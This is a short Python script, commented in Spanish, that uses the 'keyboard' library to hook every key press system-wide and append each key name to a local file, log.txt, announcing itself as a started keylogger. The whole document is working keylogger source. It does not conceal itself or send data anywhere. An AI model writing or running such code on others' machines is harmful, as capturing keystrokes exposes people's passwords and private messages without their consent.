import keyboard

LOG_FILE = "log.txt"
with open(LOG_FILE, "a") as f:
  
    def on_press(event): 
        f.write(f"{event.name} ")
        
        f.flush()

    keyboard.on_press(on_press)
    
    print(f" Keylogger iniciado. Registrando en: {LOG_FILE}. Presiona Ctrl+C para detener.")
    keyboard.wait()
